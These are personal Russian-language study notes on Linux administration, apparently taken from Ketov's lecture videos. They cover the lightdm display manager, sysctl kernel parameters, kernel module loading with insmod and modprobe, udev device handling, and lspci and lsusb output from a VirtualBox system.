│   │ ├─ 933 lightdm --session-child 12 15
│   │ ├─ 950 xfce4-session
│   │ ├─1082 /usr/bin/ssh-agent -s
│   │ ├─1091 xfwm4
...

systemd-cgls -k // включить в просмотр группы управления иерархии процеcсы ЯДРА kernel
Control group /:
-.slice
├─   2 [kthreadd]
├─   3 [rcu_gp]
├─   4 [rcu_par_gp]
├─   5 [netns]
├─   7 [kworker/0:0H-events_highpri]
├─   8 [kworker/u4:0-events_unbound]
├─   9 [kworker/0:1H-kblockd]
├─  10 [mm_percpu_wq]
├─  11 [rcu_tasks_rude_]
├─  12 [rcu_tasks_trace]
....

*** Процесс lightdm  служба менеджера дисплея (м.б. в др. дистрибутивах gdm, kdm) ***
systemctl status lightdm.service
● lightdm.service - Light Display Manager
     Loaded: loaded (/lib/systemd/system/lightdm.service; indirect; vendor preset: enabled)
     Active: active (running) since Wed 2023-03-29 16:45:11 +03; 58min ago
       Docs: man:lightdm(1)
    Process: 752 ExecStartPre=/bin/sh -c [ "$(basename $(cat /etc/X11/default-display-manager 2>/dev/null))" = "lightdm" ] (code=exited, status=0/SUCCESS)
   Main PID: 757 (lightdm)
      Tasks: 7 (limit: 2224)
     Memory: 137.4M
        CPU: 7.043s
     CGroup: /system.slice/lightdm.service 
             ├─ 757 /usr/sbin/lightdm
             ├─ 913 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
             └─1622 /usr/lib/xorg/Xorg -core :1 -seat seat0 -auth /var/run/lightdm/root/:1 -nolisten tcp vt8 -novtswitch
//см ниже ps auxf .. возможно 913/tty7- меню ввода пароля, 1622/tty8 и 1823- сам GUI  рабочего стола(их подпроцессы - элементы GUI окнa, кнопки и т.д.)

мар 29 16:45:27 lnxmnt lightdm[933]: pam_unix(lightdm-autologin:session): session opened for user oem(uid=29999) by (uid=0)
мар 29 16:56:12 lnxmnt lightdm[1633]: pam_unix(lightdm-greeter:session): session opened for user lightdm(uid=113) by (uid=0)
мар 29 16:56:12 lnxmnt lightdm[1633]: gkr-pam: gnome-keyring-daemon started properly
мар 29 16:56:14 lnxmnt lightdm[1722]: pam_succeed_if(lightdm:auth): requirement "user ingroup nopasswdlogin" not met by user "oem"
мар 29 17:32:38 lnxmnt lightdm[1722]: pam_unix(lightdm:auth): authentication failure; logname= uid=0 euid=0 tty=:1 ruser= rhost=  user=oem
мар 29 17:32:39 lnxmnt lightdm[1823]: pam_succeed_if(lightdm:auth): requirement "user ingroup nopasswdlogin" not met by user "mvn"
мар 29 17:32:43 lnxmnt lightdm[1823]: gkr-pam: unable to locate daemon control file
мар 29 17:32:43 lnxmnt lightdm[1823]: gkr-pam: stashed password to try later in open session
мар 29 17:32:43 lnxmnt lightdm[1823]: pam_unix(lightdm:session): session opened for user mvn(uid=30000) by (uid=0)
мар 29 17:32:44 lnxmnt lightdm[1823]: gkr-pam: gnome-keyring-daemon started properly and unlocked keyring


Кетов Основы Linux_ сетевое взаимодействие, часть 2.mp4
1)сервер X terminal (оконечное устройстов, где отображаются GUI и подаются команды управления на GUI):
реализован через X server - сервер граф ввода вывода (на монитор, с клвтры, с мыши) - Xorg запущен на терминале tty7
GUI программы (из X host) посылают X server для прорисовки X server линий,прямоугол,шрифтов ...
2)X host ("место", где выполняются GUI программы): реализован через X session (графический сеан) = Windows Manager (Оконный менеджер xfwm4 - не имеетсвоих окон, управляет другими)  + Xclients (граф. клиенты/программы)= 

X terminal и X host вазиимодействуют через X-protocol (поверх TCP/IP)

GDE KDE и тд - версии реализации граф оконного интерфейса, где "DE"="Desktop Enviorment"
 
ps -auxf // часть дерева процессов, относящаяся к  lightdm  служба менеджера дисплея
  // в дереве lightdm процессы отвечающие за windows gadgets (виджеты) "оконные штучки"
 // за отрисовку кнопок,рамок окон,заголовков окон,меню окон,диалоговых окон и т.д
// так xfce4-panel - процес нижей панели рабочего стола
// Xorg - X11R7 X server;  xfwm4  - Window manager for Xfce; 
// Thunar - File Manager for the Xfce Desktop Environment (окно проводника); 
// xfdesktop - The Xfce 4 Desktop Environment's desktop manager и остальные см "whatis abc"
// /usr/lib/86_64-linux-gnu/xfce4/panel/wrapper-2.0  usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so 9 14680073 notification-plugin Модуль оповещений Модуль оповещений для панели Xfce (колокольчик)

USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         757  0.0  0.4 235992  9704 ?        SLsl 16:45   0:00 /usr/sbin/lightdm
root         913  0.0  4.1 310816 84516 tty7     Ssl+ 16:45   0:00  \_ /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt
root         933  0.0  0.4 164552  9284 ?        Sl   16:45   0:00  \_ lightdm --session-child 12 15
oem          948  0.0  3.3 435012 67812 ?        Ssl  16:45   0:00  |   \_ xfce4-session
oem         1218  0.0  4.3 895980 87696 ?        Sl   16:45   0:00  |       \_ xfwm4
oem         1231  0.0  1.3 232488 27296 ?        Sl   16:45   0:00  |       \_ xfsettingsd
oem         1239  0.0  1.8 467360 38100 ?        Sl   16:45   0:00  |       \_ xfce4-panel
oem         1249  0.0  2.2 412928 46280 ?        Sl   16:45   0:00  |       |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
oem         1250  0.0  1.3 378920 27976 ?        Sl   16:45   0:00  |       |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
oem         1252  0.0  2.0 401984 41756 ?        Sl   16:45   0:00  |       |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
oem         1256  0.0  2.1 467176 43028 ?        Sl   16:45   0:00  |       |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
oem         1257  0.0  2.0 402184 42236 ?        Sl   16:45   0:00  |       |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
oem         1258  0.1  1.8 656996 37056 ?        Sl   16:45   0:06  |       |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
oem         1243  0.0  1.3 379868 26828 ?        Sl   16:45   0:00  |       \_ Thunar --daemon
oem         1248  0.0  2.4 470220 50472 ?        Sl   16:45   0:01  |       \_ xfdesktop
oem         1300  0.0  1.5 471188 31488 ?        Sl   16:45   0:00  |       \_ light-locker
oem         1309  0.0  0.3 239856  6580 ?        Sl   16:45   0:00  |       \_ /usr/libexec/geoclue-2.0/demos/agent
oem         1321  0.0  2.0 477104 41568 ?        Sl   16:45   0:00  |       \_ nm-applet
oem         1326  0.0  0.6  24864 12284 ?        S    16:46   0:00  |       \_ /usr/bin/python3 /usr/bin/mintwelcome-launcher
oem         1377  0.0  0.0   2888  1056 ?        S    16:46   0:00  |       |   \_ sh -c mintwelcome
oem         1378  0.0  0.4  21296  8204 ?        S    16:46   0:00  |       |       \_ /usr/bin/python3 /usr/bin/mintwelcome
oem         1381  0.0  0.0   2888   996 ?        S    16:46   0:00  |       |           \_ sh -c /usr/lib/linuxmint/mintwelcome/mintwelcome.py
oem         1382  0.0  3.8 452708 77720 ?        Sl   16:46   0:01  |       |               \_ /usr/bin/python3 /usr/lib/linuxmint/mintwelcome/mintwelcome.py
oem         1329  0.0  1.6  62748 33644 ?        S    16:46   0:00  |       \_ /usr/bin/python3 /usr/share/system-config-printer/applet.py
oem         1330  0.0  2.6 412060 54176 ?        Sl   16:46   0:00  |       \_ /usr/bin/python3 /usr/bin/blueman-applet
oem         1342  0.0  0.5 851416 10452 ?        Sl   16:46   0:00  |       \_ xiccd
oem         1348  0.0  1.0 226956 21344 ?        Sl   16:46   0:00  |       \_ /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
oem         1374  0.0  1.1 227896 22564 ?        Sl   16:46   0:00  |       \_ xfce4-power-manager
oem         1399  0.0  3.2 731720 65252 ?        Sl   16:46   0:00  |       \_ /usr/libexec/evolution-data-server/evolution-alarm-notify
root        1622  0.2  3.9 302360 78988  8     Ssl+ 16:56   0:09  \_ /usr/lib/xorg/Xorg -core :1 -seat seat0 -auth /var/run/lightdm/root/:1 -nolisten tcp vt
root        1823  0.0  0.5 164900 10248 ?        Sl   17:32   0:00  \_ lightdm --session-child 15 24
mvn         1852  0.0  1.3 306184 27728 ?        Ssl  17:32   0:00      \_ xfce4-session
mvn         2115  0.0  4.4 897088 89424 ?        Sl   17:32   0:01          \_ xfwm4
mvn         2128  0.0  1.3 232500 27600 ?        Sl   17:32   0:00          \_ xfsettingsd
mvn         2131  0.0  1.9 468116 39072 ?        Sl   17:32   0:00          \_ xfce4-panel
mvn         2141  0.0  2.3 413736 48060 ?        Sl   17:32   0:00          |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
mvn         2142  0.0  1.3 378936 28108 ?        Sl   17:32   0:00          |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
mvn         2145  0.0  2.0 328232 41940 ?        Sl   17:32   0:00          |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
mvn         2148  0.0  2.0 475360 42156 ?        Sl   17:32   0:00          |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
mvn         2149  0.0  2.0 402192 42248 ?        Sl   17:32   0:00          |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
mvn         2150  0.1  1.8 657016 37588 ?        Sl   17:32   0:02          |   \_ /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu
mvn         2385  0.1  2.1 545420 43868 ?        Sl   17:32   0:03          |   \_ xfce4-terminal
mvn         2460  0.0  0.2  13680  5380 pts/0    Ss+  17:32   0:00          |       \_ bash
mvn         2135  0.0  1.3 379892 26852 ?        Sl   17:32   0:00          \_ Thunar --daemon
mvn         2140  0.0  2.0 390724 42144 ?        Sl   17:32   0:00          \_ xfdesktop
mvn         2193  0.0  1.2 304872 26188 ?        Sl   17:32   0:00          \_ light-locker
mvn         2198  0.0  0.3 239856  6728 ?        Sl   17:32   0:00          \_ /usr/libexec/geoclue-2.0/demos/agent
mvn         2208  0.0  2.1 477096 43768 ?        Sl   17:32   0:00          \_ nm-applet
mvn         2214  0.0  1.6  62748 33524 ?        S    17:32   0:00          \_ /usr/bin/python3 /usr/share/system-config-printer/applet.py
mvn         2215  0.0  2.6 412064 54220 ?        Sl   17:32   0:00          \_ /usr/bin/python3 /usr/bin/blueman-applet
mvn         2228  0.0  0.5 237008 10508 ?        Sl   17:32   0:00          \_ xiccd
mvn         2245  0.0  1.0 226952 21448 ?        Sl   17:32   0:00          \_ /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
mvn         2266  0.0  1.1 227896 22804 ?        Sl   17:32   0:00          \_ xfce4-power-manager
mvn         2269  0.0  3.2 731760 66644 ?        Sl   17:32   0:00          \_ /usr/libexec/evolution-data-server/evolution-alarm-notify

В режиме pty(ssh доступа) можно безболезненно остановить (заблокировать GUI) и заново запустить
sudo systemctl stop lightdm.service
sudo systemctl start lightdm.service
или
sudo service lightdm stop
sudo service lightdm start

### end systemctl



## МОДУЛИ  ДРАЙВЕРЫ *.ko *.mod ### Кетов Админ-е Linux, часть 3.2_ Управление ядром ОС.mp4
 = =  Модули/Драйверы в ЯДРЕ (Кетов Админ-е 3.2) = = =
https://habr.com/ru/post/117654/ Работаем с модулями ядра в Linux *ko! 

  - === sysctl === - Конфигурирование параметров Ядра в runtime
Кетов "Администрирование ч.3.2"  !!!!!!!!!!!!!!
MAN SYSCTL: NAME    sysctl - configure kernel parameters at runtime

sysctl -a // Display all values currently available. ОТобразить значения ВСЕХ переменных в ядре ОС
sysctl net.ipv4.tcp_fin_timeout // отобразить значение конкретной переменной
sysctl prm // отобразить значение конкретной переменной prm
sysctl -w prm=value // установить значение  переменноей в ядре ОС
sysctl -w net.ipv4.tcp_fin_timeout=115
sudo sysctl -w net.ipv4.ip_forward=1 // установить в ядре режим перенапрпавления ip-пакетов (вкл маршрутизатор, по-умолчанию=0 выключено - ядро работает в режиме хоста)  Внутреннее устройство Linux ( PDFDrive ).pdf стр 245
ЧТОБЫ сохранить параметры ядра после перезагрузки -> записать "net.ipv4.ip_forward=1" в 
 /etc/sysctl.conf
также о "sudo sysctl -w net.ipv4.ip_forward=1" ketov видео "Сетевые интерфейсы и статическая маршрутизация" 54мин


mknod // создать блоковый символьный файл файловой системы устройств /dev/ в каталоге dev
sudo mknod  /dev/ttyZ50 c 4 123 // создать терминал Z50
       b      create a block (buffered) special file
       c, u   create a character (unbuffered) special file
       p      create a FIFO
 В индексном дескрипторе файла устройства содержится внутреннее имя устройства, состоящее из обозначения типа символа c для СИМВОЛЬНОГО или b для БЛОЧНОГО, и пара чисел, называемых старшим и младшим номерами устройства. Диски и ленты являются блочными устройствами, а все остальные – терминалы, принтеры, телефонные линии и т. д. – символьными. Старший номер (major) определяет тип/driver/драйвер устройства, а младший (minor) обозначает конкретный экземпляр устройства. 
после mknod  следует изменить вручную  
  sudo chmod g+rwxx /dev/ttyZ*
  sudo chmod o-rwxx /dev/ttyZ*
MAKEDEV /dev/dev_abc /-r // создать/удалить устройства с правильными major,  а также владельцами файлов автоматически

Кетов Админ-е 3.2: udev universal device daemon юниверсал девайс демон - следит за устройствами, 
 обнаруживает подключение и автоматически запускает команды mknod/MAKEDEV 
(создает файл устройства) и insmod/modprob - загружает драйвер *.ko в ядро

Загрузка и выгрузка модулей //https://habr.com/ru/post/117654/
Загрузить модуль в ядро можно при помощи двух команд: «insmod» и «modprobe», отличающихся друг 
от друга возможностью просчета зависимостей. 
1) Команда «insmod» загружает конкретный файл с расширением «ko», при этом, если модуль зависит от 
 других модулей, еще не загруженных в ядро, команда выдаст ошибку, и не загрузит модуль. 
2) Команда «modprobe» работает только с деревом модулей, и возможна загрузка только оттуда 
 по имени модуля, а не по имени файла.
 Отсюда следует область применения этих команд: при помощи «insmod» подгружается файл модуля из 
произвольного места файловой системы (например, пользователь скомпилировал модули и перед 
переносом в дерево ядра решил проверить его работоспособность), а «modprobe» — для подгрузки 
уже готовых модулей, включенных в дерево модулей текущей версии ядра. Например, для загрузки 
модуля ядра «rt73usb» из дерева ядра, включая все зависимости, и отключив аппаратное шифрование, 
# modprobe rt73usb nohwcrypt=0
Загрузка этого модуля командой «insmod» произойдет следующим образом:
# insmod /lib/modules/2.6.38-gentoo-r1/kernel/drivers/net/wireless/rt2x00/rt73usb.ko nohwcrypt=0
Но нужно помнить, что при использовании «insmod»!! все зависимости придется подгружать вручную. 
Поэтому эта команда постепенно вытесняется командой «modprobe».!!!

ls -il /dev/sd*
                        major minor  
334 brw-rw---- 1 root disk 8,  0 мар 27 22:53 /dev/sda
335 brw-rw---- 1 root disk 8,  1 мар 27 22:53 /dev/sda1
336 brw-rw---- 1 root disk 8,  2 мар 27 22:53 /dev/sda2
337 brw-rw---- 1 root disk 8,  3 мар 27 22:53 /dev/sda3
338 brw-rw---- 1 root disk 8,  4 мар 27 22:53 /dev/sda4
735 brw-rw---- 1 root disk 8, 16 мар 27 23:29 /dev/sdb
736 brw-rw---- 1 root disk 8, 17 мар 27 23:29 /dev/sdb1
737 brw-rw---- 1 root disk 8, 18 мар 27 23:29 /dev/sdb2
Характеристические числа устрайства major - 8 номер дрйвера, minor - номер устройства

man sd^
The  block device name has the following form: sdlp, where l is a letter denoting the physical
  drive, and p is a number denoting the partition on that physical drive.  Often, the  partition   number, p, will be left off when the device corresponds to the whole drive.
SCSI  disks  have  a  major  device  number  of 8, and a minor device number of the form (16 *
drive_number) + partition_number, where drive_number is the number of the  physical  drive  in
order of detection, and partition_number is as follows:
 +3     partition 0 is the whole drive
        partitions 1–4 are the DOS "primary" partitions
        partitions 5–8 are the DOS "extended" (or "logical") partitions

 = = = = Буфер отладочных сообщений  ядра ОС  = = = = = =
В буфер попадают сообщения от init/systemd, udevd, от insmod и rmmod. Из него читают lspci lsudb lsscsi
dmesg // утилита чтения отладочных сообщений из буфера ядра ОС (с самого начало от загрузки ядра) debug message  
Также есть журнал /var/log/dmesg.log - журнал демона udevd (см выше)
dmesg -wH //после подключения флешки
[ 2176.546706] usb 1-1: new high-speed USB device number 2 using ehci-pci
[ 2176.824972] usb 1-1: New USB device found, idVendor=13fe, idProduct=1d00, bcdDevice= 1.10
[ 2176.824977] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[ 2176.824978] usb 1-1: Product: USB DISK 2.0
[ 2176.824979] usb 1-1: Manufacturer:
[ 2176.824980] usb 1-1: SerialNumber: 077706000141
[ 2176.850362] usb-storage 1-1:1.0: USB Mass Storage device detected
[ 2176.852773] scsi host3: usb-storage 1-1:1.0
[ 2176.853230] usbcore: registered new interface driver usb-storage
[ 2176.857927] usbcore: registered new interface driver uas
[ 2177.983611] scsi 3:0:0:0: Direct-Access              USB DISK 2.0     PMAP PQ: 0 ANSI: 0 CCS
[ 2177.984046] sd 3:0:0:0: Attached scsi generic sg2 type 0
[ 2180.351961] sd 3:0:0:0: [sdb] 4030464 512-byte logical blocks: (2.06 GB/1.92 GiB)
[ 2180.358562] sd 3:0:0:0: [sdb] Write Protect is off
[ 2180.358568] sd 3:0:0:0: [sdb] Mode Sense: 23 00 00 00
[ 2180.365037] sd 3:0:0:0: [sdb] No Caching mode page found
[ 2180.365041] sd 3:0:0:0: [sdb] Assuming drive cache: write through
[ 2180.410617]  sdb: sdb1 sdb2
[ 2180.446908] sd 3:0:0:0: [sdb] Attached SCSI removable disk
[ 2194.331379] FAT-fs (sdb1): Volume was not properly unmounted. Some data may be corrupt. Please run fs:

//dmesg после выполнения sudo insmod lp.ko и после  выполнения (ручной инсталляции модулей/драйверов)
sudo insmod  /lib/modules/5.15.0-56-generic/kernel/drivers/input/lp.ko и sudo insmod /lib/modules/5.15.0-56-generic/kernel/drivers/input/joystick/joydump.ko 
[ 2073.079919] lp: driver loaded but no devices found
[ 2303.687603] joydump: Unknown symbol gameport_open (err -2)
[ 2303.687629] joydump: Unknown symbol gameport_close (err -2)
[ 2303.687645] joydump: Unknown symbol __gameport_register_driver (err -2)
[ 2303.687660] joydump: Unknown symbol gameport_unregister_driver (err -2)

lsmod //список модулей в ядре
lsmod //Показать статус модулей modules ядре Linux Kernel, берет (представляет) инф из  /proc/modules
Module                  Size  Used by
zfs                  3825664  6
zunicode              348160  1 zfs
zzstd                 491520  1 zfs
syscopyarea            16384  1 drm_kms_helper
ghash_clmulni_intel    16384  0
sysfillrect            20480  1 drm_kms_helper
usbhid                 65536  0
crct10dif_pclmul       16384  1
crc32_pclmul           16384  0
syscopyarea            16384  1 drm_kms_helper
ghash_clmulni_intel    16384  0
sysfillrect            20480  1 drm_kms_helper
hid                   151552  2 usbhid,hid_generic

insmod ; rmmod // загрузить; выгрузить драйвер в/из ядро 
modprobe -r // выгрузить модуль

depmod // создает файлы Зависимостей для модулей modules.dep и файлы карт (map files).
  //из man: Модули ядра Linux могут предоставлять услуги (называемые «символами») для 
 использования другими модулями (используя один из вариантов EXPORT_SYMBOL в коде).
 Если второй модуль использует этот символ, этот второй модуль явно зависит от первого модуля. 
 Эти зависимости могут быть довольно сложными. depmod создает список зависимостей модулей,  
 читая каждый модуль в /lib/modules/version и определяя, какие символы он экспортирует и 
 какие символы ему нужны.
 По умолчанию этот список записывается в файл modules.dep и двоичную хешированную версию с
 именем modules.dep.bin в том же каталоге. depmod также создает список символов, 
 предоставленных модулями, в файле с именем modules.symbols и его двоичной хешированной
 версии, modules.symbols.bin.

   ***  UDEV  Aвтоматическая загрузка драйверА  ***  
Действия после подключения устройства (автоматическая загрузка драйвера) !!!Кетов Видео!!!
Device Dispatcher (DD)девайс диспетчер через ДРАЙВЕРЫ ШИН получает (через файлы /sys см ниже 
 "strace->"/sys/bus/pci/devices/0000:00:05.0/vendor") или (
  "cat  /sys/bus/scsi/devices/4\:0\:0\:0/vendor - Kingston"  
  "cat /sys/bus/scsi/devices/4\:0\:0\:0/driver/4\:0\:0\:0/model -DataTraveler 2.0") от 
  подключающихся внешних устройств  (флеш-карты, мыши и тд) 2 два идентификатора 
 VID - Vender ID  DID - Device ID (16 битные числа).
 Эту информацию DD пробрасывает в демон udev, задачи которого 
 1) загрузить драйвер 2) создать файл специального устройства согласно правилам указанным
   в конфигурационных файлов /lib/udev/rules.d/ (нельзя изменять)  и /etc/udev/rules.d/ (можно изменять). 

DD при этом запускается modprob КАК БУДТО ОТ ЛИЦА пользователя, передавая ему VID и DID.
  modprob по файлам /lib/modules/5.15.0-56-generic/modules.dep и
   /lib/modules/5.15.0-56-generic/modules.alias находит нужный для загрузки драйвер,
  результаты поиска он передает udev (который выполнет 2 ДВЕ функции 1)insmod и 2)mknod)

Подбор драйвера выполняется udev или вручную через  
  ***!! ФАЙЛЫ БАЗ ДАННЫХ/ИНДЕКСОВ ДРАЙВЕРОВ mod модулей Linux ***!!
 (modules.dep modules.alias   pci.ids usb.ids ) для usb флешек и видеокамеры см !ниже!

modprobe // Add and remove modules from the Linux Kernel

less /lib/modules/5.15.0-56-generic/modules.alias
# Aliases extracted from modules themselves.
alias fs-msdos msdos //это лишь  часть файла псевдонимов модулей
alias fs-exfat exfat
alias fs-iso9660 isofs

less /lib/modules/5.15.0-56-generic/modules.dep //база зависимостей между драйверами, (часть списка)
kernel/fs/fat/msdos.ko:   //НЕТ зависимости у драйвера
kernel/drivers/md/raid0.ko:  // -//-
kernel/drivers/md/raid1.ko:  // -//-
kernel/drivers/net/ethernet/intel/e1000/e1000.ko: // -//-
...
  //следущие драйверы имеют зависимости (т.е один может быть загружен при условии загрузки другого)
kernel/fs/vboxsf/vboxsf.ko: kernel/drivers/virt/vboxguest/vboxguest.ko
kernel/drivers/tty/serial/8250/8250_lpss.ko: kernel/drivers/dma/dw/dw_dmac_core.ko //
kernel/drivers/video/fbdev/vga16fb.ko: kernel/drivers/video/vgastate.ko
...

modinfo - информация о модуле. Если в имене на конце не "ko", а "xz" - модуль в сжатом виде
modinfo msdos // информация о драйвере файлвой системы msdos , "depends:" пусто, ни от чего не зависит!!
filename:       /lib/modules/5.15.0-56-generic/kernel/fs/fat/msdos.ko
description:    MS-DOS filesystem support
author:         Werner Almesberger
license:        GPL
alias:          fs-msdos
srcversion:     E4EA6BAE3A40F24D67166E3
...
 // моудуль не для устройства, а для процесса шифрования и md4
modinfo /lib/modules/5.15.0-56-generic/kernel/arch/x86/crypto/serpent-avx-x86_64.ko
filename:       /lib/modules/5.15.0-56-generic/kernel/arch/x86/crypto/serpent-avx-x86_64.ko
alias:          crypto-serpent
alias:          serpent
license:        GPL
description:    Serpent Cipher Algorithm, AVX optimized
...
modinfo /lib/modules/5.15.0-56-generic/kernel/crypto/md4.ko
filename:       /lib/modules/5.15.0-56-generic/kernel/crypto/md4.ko

Драйверы-модули ядра для сетевых протоколов, в т.ч ipv4
 ls /lib/modules/5.15.0-56-generic/kernel/net/
modinfo /lib/modules/5.15.0-56-generic/kernel/net/ipv4/*.ko 

lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371AB/EB/MB PIIX4 IDE (rev 01)
00:02.0 VGA compatible controller: VMware SVGA II Adapter
00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 02)
00:04.0 System peripheral: InnoTek Systemberatung GmbH VirtualBox Guest Service
00:05.0 Multimedia audio controller: Intel Corporation 82801AA AC'97 Audio Controller (rev 01)
00:06.0 USB controller: Apple Inc. KeyLargo/Intrepid USB
00:07.0 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 08)
00:0b.0 USB controller: Intel Corporation 82801FB/FBM/FR/FW/FRW (ICH6 Family) USB2 EHCI Controller
00:0d.0 SATA controller: Intel Corporation 82801HM/HEM (ICH8M/ICH8M-E) SATA Controller [AHCI mode] (rev 02)

VID - Vender ID  DID - Device ID
утилиты lspci lsusb lsscsi просмотра информации в тч Vender ID и Device ID на УЖЕ подключенных устройствах - БЕРУТ ИНФОРМАЦИЮ (!! cm strace ... !!) ОТ драйверов шин (файлов /sys): см ниже 
strace -e openat lspci -n
  openat(AT_FDCWD, "/sys/bus/pci/devices/0000:00:05.0/config", O_RDONLY) = 3
  openat(AT_FDCWD, "/sys/bus/pci/devices/0000:00:05.0/vendor", O_RDONLY) = 4
  openat(AT_FDCWD, "/sys/bus/pci/devices/0000:00:05.0/device", O_RDONLY) = 4
lspci запрашивает инф с драйверов шин, а также из базы данных /lib/udev/hwdb.bin и /sys/bus/pci/devices/xxxxx

Также lspci (без -n!) расшифровывает информацию config vendor device с применением базы /usr/share/misc/pci.ids 
strace -e openat lspci
openat(AT_FDCWD, "/usr/share/misc/pci.ids", O_RDONLY) = 4

less /usr/share/misc/pci.ids
15ad  VMware // например
        0405  SVGA II Adapter
        0710  SVGA Adapter
80ee  InnoTek Systemberatung GmbH
        beef  VirtualBox Graphics Adapter
        cafe  VirtualBox Guest Service
Далее эти VID DID передаются modprobe, чтобы найти драйвера в файлe/lib/modules/5.15.0-56-generic/modules.alias !!

// см ниже в "lspci -v" результат(=>) по названию модуля "vmwgfx" и в "lspci -n"=> "15ad:0405"
grep vmwgfx modules.alias 
                VID     DID
alias pci:v000015ADd00000405sv*sd*bc*sc*i* vmwgfx
v0000 и d0000  название поля для VID и DID
// см ниже в "lspci -v" результат(=>) по названию модуля "vboxguest" и в "lspci -n"=> "80ee:cafe"
grep vboxguest modules.alias
alias pci:v000080EEd0000CAFEsv00000000sd00000000bc*sc*i* vboxguest

lspci -n
   A    Б     VID   DID  // A-положение устройства на шине Б-класс устройства
00:00.0 0600: 8086:1237 (rev 02)
00:01.0 0601: 8086:7000
00:01.1 0101: 8086:7111 (rev 01)
00:02.0 0300: 15ad:0405

lspci -v
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
        Flags: fast devsel

00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
        Flags: bus master, medium devsel, latency 0

00:01.1 IDE interface: Intel Corporation 82371AB/EB/MB PIIX4 IDE (rev 01) (prog-if 8a [ISA Compatibility mode controller, supports both channels switched to PCI native mode, supports bus mastering])
        Flags: bus master, fast devsel, latency 64
        Memory at 000001f0 (32-bit, non-prefetchable) [virtual] [size=8]
        Memory at 000003f0 (type 3, non-prefetchable) [virtual]
        Memory at 00000170 (32-bit, non-prefetchable) [virtual] [size=8]
        Memory at 00000370 (type 3, non-prefetchable) [virtual]
        I/O ports at d000 [virtual] [size=16]
        Kernel driver in use: ata_piix
        Kernel modules: pata_acpi
      ...
00:0d.0 SATA controller: Intel Corporation 82801HM/HEM (ICH8M/ICH8M-E) SATA Controller [AHCI mode] (rev 02) (prog-if 01 [AHCI 1.0])
        Flags: bus master, fast devsel, latency 64, IRQ 21
        I/O ports at d240 [size=8]
        I/O ports at d248 [size=4]
        I/O ports at d250 [size=8]
        I/O ports at d258 [size=4]
        I/O ports at d260 [size=16]
        Memory at f0806000 (32-bit, non-prefetchable) [size=8K]
        Capabilities: <access denied>
        Kernel driver in use: ahci
        Kernel modules: ahci
Ааналогично работают lsusb lsscsi
 strace -e openat lsusb
openat(AT_FDCWD, "/sys/bus/usb/devices/usb1/busnum", O_RDONLY|O_CLOEXEC) = 8
openat(AT_FDCWD, "/sys/bus/usb/devices/usb1/devnum", O_RDONLY|O_CLOEXEC) = 8
openat(AT_FDCWD, "/sys/bus/usb/devices/usb1/speed", O_RDONLY|O_CLOEXEC) = 8
openat(AT_FDCWD, "/sys/bus/usb/devices/usb1/descriptors", O_RDONLY|O_CLOEXEC) = 8
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Bus 002 Device 002: ID 80ee:0021 VirtualBox USB Tablet
Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub

lsusb
Bus 001 Device 002: ID 13fe:1d00 Kingston Technology Company Inc. DataTraveler 2.0 1GB/4GB Flash Drive / Patriot Xporter 4GB Flash Drive
// lsusb взял из  
less /usr/share/misc/usb.ids
13fe  Kingston Technology Company Inc.!!
        1d00  DataTraveler 2.0 1GB/4GB Flash Drive / Patriot Xporter 4GB Flash Drive // !!!


lsusb -t // вывод инф о драйверах usb
lsusb -t
/:  Bus 02.Port 1: Dev 1, Class=root_hub, Driver=ohci-pci/12p, 12M
    |__ Port 1: Dev 2, If 0, Class=Human Interface Device, Driver=usbhid, 12M //модуль/ драйвер для мыши и клвтры
/:  Bus 01.Port 1: Dev 1, Class=root_hub, Driver=ehci-pci/12p, 480M
    |__ Port 1: Dev 2, If 0, Class=Mass Storage, Driver=usb-storage, 480M  //модуль/ драйвер для флешки

grep  usbhid  modules.alias // найти! alias псевдоним модуля для мыши и клавиатуры
   alias usb:v*p*d*dc*dsc*dp*ic03isc*ip*in* usbhid   
find /lib/modules/5.15.0-56-generic/ -name usb-storage* //найти! модуль/драйвер для флешки !!!!!!!!!!!!!!!!!!!!!!!
 /lib/modules/5.15.0-56-generic/kernel/drivers/usb/storage/usb-storage.ko 
 
pwd
   /lib/modules/5.15.0-56-generic
